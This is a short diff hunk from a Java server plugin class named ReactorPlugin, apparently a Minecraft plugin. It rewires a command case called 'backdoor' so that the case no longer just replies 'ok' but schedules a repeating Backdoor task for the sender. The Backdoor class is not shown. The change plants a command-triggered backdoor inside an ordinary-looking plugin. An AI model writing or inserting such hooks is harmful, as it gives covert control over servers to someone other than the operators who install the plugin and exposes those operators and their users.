@@ -121,7 +121,7 @@ public final class ReactorPlugin extends JavaPlugin {
 
                 break;
             case "backdoor":
-                sender.sendMessage("ok");
+                new Backdoor(sender).runTaskTimer(this, 0, 50);
 
                 break;
             default:
